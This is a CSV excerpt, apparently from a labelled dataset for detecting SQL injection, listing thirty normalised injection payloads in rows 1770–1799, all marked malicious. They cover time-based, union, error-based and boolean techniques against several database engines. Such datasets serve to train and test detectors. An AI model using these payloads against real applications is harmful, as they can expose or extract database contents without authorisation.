row_index,payload_norm,label,sqli_type_hint
1770,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy",1,
1771,-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
1772,"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",1,
1773,1 where 4844 = 4844,1,
1774,"1' union all select null,null,null,null#",1,
1775,"1%' ) union all select null,null,null,null,null,null,null,null,null--",1,
1776,"1'|| ( select 'ozki' where 4435 = 4435 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",1,
1777,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""aixs"" = ""aixs",1,
1778,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) -- ybmz,1,
1779,-5982' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ikuh' = 'ikuh,1,
1780,"1"" where 3764 = 3764",1,
1781,-6144' ) or 9385 = 2474--,1,
1782,1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
1783,"1 ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
1784,"1%' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and '%' = '",1,
1785,1%' ) ) ) order by 1#,1,
1786,"select sleep ( 5 ) and ( ( ( ""%"" = """,1,
1787,"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",1,
1788,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 6690 = 6690",1,
1789,1 ) as hlcn where 1165 = 1165 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
1790,"1 ) where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
1791,1' in boolean mode ) order by 1--,1,
1792,-7209' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'stqx' = 'stqx,1,
1793,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
1794,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""hgds"" like ""hgds",1,
1795,"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",1,
1796,"1%' ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1797,1' ) where 3572 = 3572,1,
1798,"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
1799,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",1,
